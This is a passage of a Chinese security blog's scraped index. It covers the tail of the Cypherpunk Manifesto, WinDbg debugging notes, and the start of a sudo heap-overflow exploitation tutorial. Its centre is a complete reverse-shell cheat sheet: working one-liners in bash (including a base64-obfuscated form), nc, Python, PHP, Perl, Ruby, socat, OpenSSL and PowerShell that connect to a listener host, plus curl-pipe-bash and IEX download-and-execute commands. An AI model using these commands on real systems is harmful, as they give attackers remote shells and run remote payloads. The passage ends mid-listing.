is not salient. When I purchase a magazine at a store and hand cash to the clerk, there is no need to know who I am. When I ask my electronic mail provider to send and receive messages, my provider need not know to whom I am speaking or what I am saying or what others are saying to me; my provider only need know how to get the message there and how much I owe them in fees. When my identity is revealed by the underlying mechanism of the transaction, I have no privacy. I cannot here selectively reveal myself; I must always reveal myself. Therefore, privacy in an open society requires anonymous transaction systems. Until now, cash has been the primary such system. An anonymous transaction system is not a secret transaction system. An anonymous system empowers individuals to reveal their identity when desired and only when desired; this is the essence of privacy. Privacy in an open society also requires cryptography. If I say something, I want it heard only by those for whom I intend it. If the content of my speech is available to the world, I have no privacy. To encrypt is to indicate the desire for privacy, and to encrypt with weak cryptography is to indicate not too much desire for privacy. Furthermore, to reveal one’s identity with assurance when the default is anonymity requires the cryptographic signature. We cannot expect governments, corporations, or other large, faceless organizations to grant us privacy out of their beneficence. It is to their advantage to speak of us, and we should expect that they will speak. To try to prevent their speech is to fight against the realities of information. Information does not just want to be free, it longs to be free. Information expands to fill the available storage space. Information is Rumor’s younger, stronger cousin; Information is fleeter of foot, has more eyes, knows more, and understands less than Rumor. We must defend our own privacy if we expect to have any. We must come together and create systems which allow anonymous transactions to take place. People have been defending their own privacy for centuries with whispers, darkness, envelopes, closed doors, secret handshakes, and couriers. The technologies of the past did not allow for strong privacy, but electronic technologies do. We the Cypherpunks are dedicated to building anonymous systems. We are defending our privacy with cryptography, with anonymous mail forwarding systems, with digital signatures, and with electronic money. Cypherpunks write code. We know that someone has to write software to defend privacy, and since we can’t get privacy unless we all do, we’re going to write it. We publish our code so that our fellow Cypherpunks may practice and play with it. Our code is free for all to use, worldwide. We don’t much care if you don’t approve of the software we write. We know that software can’t be destroyed and that a widely dispersed system can’t be shut down. Cypherpunks deplore regulations on cryptography, for encryption is fundamentally a private act. The act of encryption, in fact, removes information from the public realm. Even laws against cryptography reach only so far as a nation’s border and the arm of its violence. Cryptography will ineluctably spread over the whole globe, and with it the anonymous transactions systems that it makes possible. For privacy to be widespread it must be part of a social contract. People must come and together deploy these systems for the common good. Privacy only extends so far as the cooperation of one’s fellows in society. We the Cypherpunks seek your questions and your concerns and hope we may engage you so that we do not deceive ourselves. We will not, however, be moved out of our course because some may disagree with our goals. The Cypherpunks are actively engaged in making the networks safer for privacy. Let us proceed together apace. Onward. Eric Hughes 9 March 1993","categories":[{"name":"misc","slug":"misc","permalink":"https://joe1sn.eu.org/categories/misc/"}],"tags":[{"name":"misc","slug":"misc","permalink":"https://joe1sn.eu.org/tags/misc/"},{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/tags/CVE/"}]},{"title":"常规反弹shell合集","slug":"reverse-shell","date":"2022-07-29T11:18:41.000Z","updated":"2023-06-01T14:26:19.370Z","comments":true,"path":"2022/07/29/reverse-shell/","link":"","permalink":"https://joe1sn.eu.org/2022/07/29/reverse-shell/","excerpt":"反弹shell的常见方式","text":"反弹shell的常见方式 反弹Shell-Linux 12345678【监听端】centos: 192.168.35.152【被控端】kali: 192.168.35.128 # 监听端执行[root@localhost ~]# nc -vvl 7777Ncat: Version 7.50 ( https://nmap.org/ncat )Ncat: Listening on :::7777Ncat: Listening on 0.0.0.0:7777 bash 123┌──(root@kali)-[/home/kali]└─# bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777 0&gt;&amp;1 # 执行失败 zsh: 没有那个文件或目录: /dev/tcp/192.168.35.152/7777 0.tcp.ngrok.io:15122 bash -i &gt;&amp; /dev/tcp/0.tcp.ngrok.io/15122 0&gt;&amp;1 bash base64 12# /bin/bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777 0&gt;&amp;1bash -c &#x27;&#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzUuMTUyLzc3NzcgMD4mMSAgIA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27; bash base64 URLencode 12# /bin/bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777 0&gt;&amp;1bash -c &#x27;&#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzUuMTUyLzc3NzcgMD4mMSAgIA%3D%3D&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27; nc 123nc -e /bin/bash 192.168.35.152 7777mknod backpipe p &amp;&amp; nc 192.168.35.152 7777 0&lt;backpipe | /bin/bash 1&gt;backpipe rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.35.152 7777 &gt;/tmp/f ncat 12ncat 192.168.35.152 7777 -e /bin/bashncat --udp 192.168.35.152 7777 -e /bin/bash curl 123456# kali开启http服务，把bash命令写入html文件cat bash.html/bin/bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777 0&gt;&amp;1# centoscurl 192.168.35.152/bash.html|bash http 攻击方： 1234# 编写shell脚本并启动http服务器echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777 0&gt;&amp;1&quot; &gt; shell.shpython2环境下：python -m SimpleHTTPServer 80python3环境下：python -m http.server 80 被控端： 1234# 上传shell.sh文件wget 192.168.35.152/shell.sh# 执行shell.sh文件bash shell.sh crontab 1* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777 0&gt;&amp;1 whois 12# 只能执行指定命令，如pwd命令whois -h 192.168.35.152 -p 7777 `pwd` python 1python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.35.152&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; php 1php -r &#x27;$sock=fsockopen(&quot;192.168.35.152&quot;,7777);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27; ruby 12ruby -rsocket -e&#x27;f=TCPSocket.open(&quot;192.168.35.152&quot;,7777).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27; # 执行失败ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;192.168.35.152&quot;,&quot;7777&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27; socat 1socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:192.168.35.152:7777 perl 1perl -e &#x27;use Socket;$i=&quot;192.168.35.152&quot;;$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27; php 1php -r &#x27;$sock=fsockopen(&quot;192.168.35.152&quot;,7777);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27; openssl 12345678# 监听端openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodesopenssl s_server -quiet -key key.pem -cert cert.pem -port 7777# orncat --ssl -vv -l -p 7777# 受控端mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.35.152:7777 &gt; /tmp/s; rm /tmp/s 反弹Shell-Windows Windows下的反弹shell仅测试了nc，执行成功。 12345678【监听端】centos: 192.168.35.152【被控端】windows: 192.168.35.1 # 监听端执行[root@localhost ~]# nc -vvl 7777Ncat: Version 7.50 ( https://nmap.org/ncat )Ncat: Listening on :::7777Ncat: Listening on 0.0.0.0:7777 powercat 项目地址：https://github.com/besimorhino/powercat 1System.Net.Webclient.DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;);powercat -c 192.168.35.152 -p 7777 -e cmd nc 1nc 192.168.35.152 7777 -e c:\\windows\\system32\\cmd.exe nishang Nishang是一个基于PowerShell的攻击框架，整合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell。 项目地址：https://github.com/samratashok/nishang 12# 将nishang下载到攻击者本地，在目标机使用powershell执行以下命令IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.159.134/nishang/Shells/Invoke-PowerShellTcp.ps1&#x27;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.35.152 -port 7777 Reverse UDP shell 123IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.35.152/nishang/Shells/Invoke-PowerShellUdp.ps1&#x27;);Invoke-PowerShellUdp -Reverse -IPAddress 192.168.35.152 -port 7777 MSF 12345# 找出各类反弹一句话payload的路径信息msfvenom -l payloads | grep &#x27;cmd/windows/reverse&#x27;# 生成反弹shell，复制粘贴到靶机上运行msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.35.152 LPORT=7777","categories":[{"name":"pentest","slug":"pentest","permalink":"https://joe1sn.eu.org/categories/pentest/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://joe1sn.eu.org/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"windbg调试入门笔记","slug":"windbg-note","date":"2022-06-10T03:52:56.000Z","updated":"2023-06-01T14:26:48.239Z","comments":true,"path":"2022/06/10/windbg-note/","link":"","permalink":"https://joe1sn.eu.org/2022/06/10/windbg-note/","excerpt":"准备点windows基础功","text":"准备点windows基础功 安装与配置 1.版本 WinDbg一般分为x86和x64，具体由调试os平台(Host)和被调试程序类型决定 x86-based Host Computer x86处理器平台上调试所有程序都使用该版本 x64-based Host Computer 分析DUMP文件：若文件是在windows XP及更新的版本生成的，则两者都可；若Windows2000及更早的版本就只能使用x86版本的WinDbg 双机调试 对于WindowsXP及其更新的系统windbg会自动适应，更老的只能使用x86版本 用户态 x64版本程序只能使用x64版本，x86版本程序则是两者皆可 2.工作空间 ​ 每调试一个程序，会涉及到要使用的参数、配置等信息，WinDBG会使用Workspace来保存这些信息，可以理解为项目文件 ​ 3.调试符号 ​ 最经典的就是使用IDA反汇编的时候，如果文件没有调试符号信息，那么函数就会被命名为sub_startaddr这样。所以在调试的时候这些信息会大大帮助我们理解程序 ​ windows的就是PDB文件， WinDBG允许用户指定一个或者多个目录存放符号文件，并使用环境变量_NT_SYMBOL_PATH指向目录，最常用的是从微软的符号服务器下载(IDA会默认加载，并且设置了全局变量为符号服务器的话每次vs编译都会从服务器拉，特别慢)，具体配置百度 相关指令 ld：自动从符号文件目录或者符号服务器加载符号文件 使用 lm 查看模块 符号的表达：模块名!函数名， 如kernel32模块的OpenProcess函数：kernel32!OpenProcess 内核不同，比如 ntdll!NtOpenProcess 和 nt!NtOpenProcess 分别表示ntdll中的NtOpenProcess函数 和 内核模块中的NtOpenProcess函数 符号检索：x [选项] Module!Symbol 符号名可以使用? * [] # +进行模糊匹配 源码级别调试 需要源文件于WinDBG在同一系统中，使用ctrl+P，指定源代码路径就行了，多个路径使用;分隔 使用ctrl+O选择源代码文件，在源代码文件中F9添加断点 调试过程 1.开始调试 反汇编代码默认停留在ntdll中的系统断点，使用g @$exentry跳转带函数入口 2.控制目标程序执行 伪寄存器@$ra表示当前函数返回地址，那么pa @$ra则表示跳出当前函数 断点命令 1.对于int 3 分别是bp bu bm bp[ID] [选项] [地址or符号[要忽略的中断次数]] [中断时执行的命令] 选项：/l 一次性断点；/c最大调用深度；/C最小调用深度 bu kernel32!GetVersion：对符号下断点 bu kernel32!GetVersio*：对包含通配符下断点 2.硬件断点 ba[ID] 访问方式 访问长度 [选项] [断点地址or符号[忽略中断次数]] [终端执行指令] 访问方式 e：读取或执行时触发 r：读取时触发 w：写入时触发 i：在执行输入输出时触发 3.条件断点 建议用到的时候百度 4.管理断点 bl：列出所有断点 bc bd be：删除 禁止 启用断点 栈窗口 123456780:000:x86&gt; k # ChildEBP RetAddr00 0019ff3c 0040112e esp+0x115e01 0019ff54 00401097 esp+0x112e02 0019ff64 00401009 esp+0x109703 0019ff80 77037a7e esp+0x100904 0019ffdc 77037a4e ntdll_76fd0000!__RtlUserThreadStart+0x2f05 0019ffec 00000000 ntdll_76fd0000!_RtlUserThreadStart+0x1b 每一行都是当前线程的一个栈帧，00~05是站的调用链，从当前到顶层。 第一列是基地址(ChildEBP)；第二列是返回地址；第三列是函数的执行地址 123456780:000:x86&gt; kb # ChildEBP RetAddr Args to Child 00 0019ff3c 0040112e 00000008 00000007 00000006 esp+0x115e01 0019ff54 00401097 00000004 00000003 0019ff80 esp+0x112e02 0019ff64 00401009 00000002 00000001 7681fa29 esp+0x109703 0019ff80 77037a7e 002f5000 f602b8bf 00000000 esp+0x100904 0019ffdc 77037a4e ffffffff 77058a01 00000000 ntdll_76fd0000!__RtlUserThreadStart+0x2f05 0019ffec 00000000 00401000 002f5000 00000000 ntdll_76fd0000!_RtlUserThreadStart+0x1b kb会显示栈上面的前3个参数 kp ：参数和参数值按函数原型显示 kv：相对于kp增加帧指针省略信息和调用约定显示 kd：列出栈中的数据 内存命令 1.查看内存 d[类型] [地址范围] dw：DWORD dd：4字节DWORD dp：8字节 df：4字节单精度浮点 dp：指针大小格式 da：ASCII字符串 db：字节和ASCII字符串 ds：ANSI_STRING dt [模块名!]类型名：显示数据类型和数据结构 2.搜索内存 s - [type] range pattern type：搜索的数据类型：b(byte) w(word) d(dword) a(ASCII) u(Unicode) range： 起始地址与终止地址 s -a 0x4000000 0x4030000 &quot;test&quot; 起始地址和搜索长度 s -a 0x0000000 L?0x7fffffff &quot;mytest&quot; 3.修改内存 e &#123;a|u|za|zu&#125; address &quot;String&quot; e &#123;a|b|d|D|f|q|u|w&#125; address [value] 4.观察内存属性 !address [Address] 脚本 winDBG可以像python一样解释执行脚本中的语言 1.伪寄存器 @$exentry：当前进程的入口，g @$exentry可以直达入口 $ip：指令指针寄存器 $ra：当前函数返回地址 $retreg：函数返回值 $csp：当前栈指针(current stack pointer) 其余建议百度 调试拓展功能 类似于插件的加载 开发的话可以参考WinDbg提供的sdk（在安装文件夹下就有）","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"dbg","slug":"dbg","permalink":"https://joe1sn.eu.org/tags/dbg/"},{"name":"Windows","slug":"Windows","permalink":"https://joe1sn.eu.org/tags/Windows/"}]},{"title":"SUDO堆溢出提权：从fuzz到exp [3]","slug":"sudo-fuzz2exp-3","date":"2022-04-13T23:40:53.000Z","updated":"2023-06-01T14:24:18.025Z","comments":true,"path":"2022/04/14/sudo-fuzz2exp-3/","link":"","permalink":"https://joe1sn.eu.org/2022/04/14/sudo-fuzz2exp-3/","excerpt":"前文：https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ 受到youtuber：LiveOverflow的系列教程的启发，我发现在中文互联网上并没有相关的翻译教程，所以我想以实验报告的形式来创造这个从fuzz到exp的系列图文教程 原始视频合集：https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx 原始Blog：https://liveoverflow.com/why-pick-sudo-research-target-part-1/ 原作者代码仓库：https://github.com/LiveOverflow/pwnedit","text":"前文：https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ 受到youtuber：LiveOverflow的系列教程的启发，我发现在中文互联网上并没有相关的翻译教程，所以我想以实验报告的形式来创造这个从fuzz到exp的系列图文教程 原始视频合集：https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx 原始Blog：https://liveoverflow.com/why-pick-sudo-research-target-part-1/ 原作者代码仓库：https://github.com/LiveOverflow/pwnedit My previous blog: https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ I was inspired by the LiveOverflow’s Sudo Vulnerability Walkthrough on youtube, but i found there’s no Chinese version of this walkthrough tutorial, so i decided to write in experimental report way to create this “from fuzz to exploit” series. Original Videos: https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx Original Blog: https://liveoverflow.com/why-pick-sudo-research-target-part-1/ Source Project Code: https://github.com/LiveOverflow/pwnedit 本节内容： Discussing Heap Exploit Strategies for sudo - Ep. 09 Developing a Tool to Find Function Pointers on The Heap | Ep. 10 Fuzzing Heap Layout to Overflow Function Pointers | Ep. 11 Developing GDB Extension for Heap Exploitation | Ep. 12 编写exp思路 对于CTF中常见的堆思路是通过堆分配算法，使用free、malloc进行exp的编写，所以一般会出现一些菜单让你使用这些功能。本质上是攻击堆分配算法 但是在漏洞利用中，只存在这一个堆溢出，我们无法进行系列的free、malloc，所以思路是能否攻击堆内的有效数据，尝试找到堆内的函数指针或者其他有用的数据。本质上是攻击堆上的数据 GDB调试 不适用asan重新编译后，使用GEF分析crash时堆的分布 一个很明显的堆溢出，再看看出发时的堆分布 断点 堆chunk 再次到达断点，堆溢出 困难与解决 这样的堆分配情况让我们很难使用堆风水去调整堆分配，并且在程序运行中会遇到各种何样的内存分配情况，哪怕是不一样的长度都会造成堆分配的不同，进而让数据分配到不同的地方。 如何解决，有两个思路 作者收到了原文报告的启发，尝试编写小工具去“控制”堆 To implement this initial technique, we wrote a rudimentary brute-forcer that executes Sudo inside gdb, overflows the “user_args” buffer, and randomly selects the following parameters: 通过覆写其他堆中的函数指针来实现rce或者提权 函数指针工具编写 思路分析 从gdb的vmmap指令我们知道程序有哪些代码段 如果在堆内存中带有x即可执行权限的话就可能存在能够被我们利用的函数指针 工具编写 写入但是没有溢出的情况下，在漏洞函数断点，dump内存 1dump binary memory /pwd/heap 0x005555555f9000 0x00555555637000 复制vmmap结果，尝试分析出有可执行权限的内存地址 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354550x00555555554000 0x0055555555b000 0x00000000000000 r-- /pwd/sudo_test/src/sudo0x0055555555b000 0x005555555d6000 0x00000000007000 r-x /pwd/sudo_test/src/sudo0x005555555d6000 0x005555555f4000 0x00000000082000 r-- /pwd/sudo_test/src/sudo0x005555555f4000 0x005555555f5000 0x0000000009f000 r-- /pwd/sudo_test/src/sudo0x005555555f5000 0x005555555f9000 0x000000000a0000 rw- /pwd/sudo_test/src/sudo0x005555555f9000 0x00555555637000 0x00000000000000 rw- [heap]0x007ffff7cc1000 0x007ffff7d02000 0x00000000000000 rw-0x007ffff7d02000 0x007ffff7d05000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d05000 0x007ffff7d0c000 0x00000000003000 r-x /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d0c000 0x007ffff7d0e000 0x0000000000a000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d0e000 0x007ffff7d0f000 0x0000000000b000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d0f000 0x007ffff7d10000 0x0000000000c000 rw- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d10000 0x007ffff7d16000 0x00000000000000 rw-0x007ffff7d16000 0x007ffff7d1d000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache0x007ffff7d1d000 0x007ffff7d4f000 0x00000000000000 r-- /usr/lib/locale/C.UTF-8/LC_CTYPE0x007ffff7d4f000 0x007ffff7d51000 0x00000000000000 rw-0x007ffff7d51000 0x007ffff7d73000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7d73000 0x007ffff7eeb000 0x00000000022000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7eeb000 0x007ffff7f39000 0x0000000019a000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7f39000 0x007ffff7f3d000 0x000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7f3d000 0x007ffff7f3f000 0x000000001eb000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7f3f000 0x007ffff7f43000 0x00000000000000 rw-0x007ffff7f43000 0x007ffff7f45000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f45000 0x007ffff7f56000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f56000 0x007ffff7f5c000 0x00000000013000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f5c000 0x007ffff7f5d000 0x00000000019000 --- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f5d000 0x007ffff7f5e000 0x00000000019000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f5e000 0x007ffff7f5f000 0x0000000001a000 rw- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f5f000 0x007ffff7f65000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f65000 0x007ffff7f76000 0x00000000006000 r-x /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f76000 0x007ffff7f7c000 0x00000000017000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f7c000 0x007ffff7f7d000 0x0000000001c000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f7d000 0x007ffff7f7e000 0x0000000001d000 rw- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f7e000 0x007ffff7f82000 0x00000000000000 rw-0x007ffff7f82000 0x007ffff7f84000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7f84000 0x007ffff7f99000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7f99000 0x007ffff7fb3000 0x00000000017000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7fb3000 0x007ffff7fb4000 0x00000000030000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7fb4000 0x007ffff7fb5000 0x00000000031000 rw- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7fb5000 0x007ffff7fbd000 0x00000000000000 rw-0x007ffff7fbd000 0x007ffff7fbe000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fbe000 0x007ffff7fbf000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fbf000 0x007ffff7fc0000 0x00000000002000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fc0000 0x007ffff7fc1000 0x00000000002000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fc1000 0x007ffff7fc2000 0x00000000003000 rw- /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fc2000 0x007ffff7fc4000 0x00000000000000 rw-0x007ffff7fca000 0x007ffff7fce000 0x00000000000000 r-- [vvar]0x007ffff7fce000 0x007ffff7fcf000 0x00000000000000 r-x [vdso]0x007ffff7fcf000 0x007ffff7fd0000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7fd0000 0x007ffff7ff3000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7ff3000 0x007ffff7ffb000 0x00000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7ffc000 0x007ffff7ffd000 0x0000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7ffd000 0x007ffff7ffe000 0x0000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7ffe000 0x007ffff7fff000 0x00000000000000 rw-0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack] 编写python脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384vmmap=&#x27;&#x27;&#x27;0x00555555554000 0x0055555555b000 0x00000000000000 r-- /pwd/sudo_test/src/sudo0x0055555555b000 0x005555555d6000 0x00000000007000 r-x /pwd/sudo_test/src/sudo0x005555555d6000 0x005555555f4000 0x00000000082000 r-- /pwd/sudo_test/src/sudo0x005555555f4000 0x005555555f5000 0x0000000009f000 r-- /pwd/sudo_test/src/sudo0x005555555f5000 0x005555555f9000 0x000000000a0000 rw- /pwd/sudo_test/src/sudo0x005555555f9000 0x00555555637000 0x00000000000000 rw- [heap]0x007ffff7cc1000 0x007ffff7d02000 0x00000000000000 rw-0x007ffff7d02000 0x007ffff7d05000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d05000 0x007ffff7d0c000 0x00000000003000 r-x /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d0c000 0x007ffff7d0e000 0x0000000000a000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d0e000 0x007ffff7d0f000 0x0000000000b000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d0f000 0x007ffff7d10000 0x0000000000c000 rw- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d10000 0x007ffff7d16000 0x00000000000000 rw-0x007ffff7d16000 0x007ffff7d1d000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache0x007ffff7d1d000 0x007ffff7d4f000 0x00000000000000 r-- /usr/lib/locale/C.UTF-8/LC_CTYPE0x007ffff7d4f000 0x007ffff7d51000 0x00000000000000 rw-0x007ffff7d51000 0x007ffff7d73000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7d73000 0x007ffff7eeb000 0x00000000022000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7eeb000 0x007ffff7f39000 0x0000000019a000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7f39000 0x007ffff7f3d000 0x000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7f3d000 0x007ffff7f3f000 0x000000001eb000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7f3f000 0x007ffff7f43000 0x00000000000000 rw-0x007ffff7f43000 0x007ffff7f45000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f45000 0x007ffff7f56000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f56000 0x007ffff7f5c000 0x00000000013000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f5c000 0x007ffff7f5d000 0x00000000019000 --- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f5d000 0x007ffff7f5e000 0x00000000019000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f5e000 0x007ffff7f5f000 0x0000000001a000 rw- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f5f000 0x007ffff7f65000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f65000 0x007ffff7f76000 0x00000000006000 r-x /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f76000 0x007ffff7f7c000 0x00000000017000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f7c000 0x007ffff7f7d000 0x0000000001c000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f7d000 0x007ffff7f7e000 0x0000000001d000 rw- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f7e000 0x007ffff7f82000 0x00000000000000 rw-0x007ffff7f82000 0x007ffff7f84000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7f84000 0x007ffff7f99000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7f99000 0x007ffff7fb3000 0x00000000017000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7fb3000 0x007ffff7fb4000 0x00000000030000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7fb4000 0x007ffff7fb5000 0x00000000031000 rw- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7fb5000 0x007ffff7fbd000 0x00000000000000 rw-0x007ffff7fbd000 0x007ffff7fbe000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fbe000 0x007ffff7fbf000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fbf000 0x007ffff7fc0000 0x00000000002000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fc0000 0x007ffff7fc1000 0x00000000002000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fc1000 0x007ffff7fc2000 0x00000000003000 rw- /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fc2000 0x007ffff7fc4000 0x00000000000000 rw-0x007ffff7fca000 0x007ffff7fce000 0x00000000000000 r-- [vvar]0x007ffff7fce000 0x007ffff7fcf000 0x00000000000000 r-x [vdso]0x007ffff7fcf000 0x007ffff7fd0000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7fd0000 0x007ffff7ff3000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7ff3000 0x007ffff7ffb000 0x00000000024000 r-- 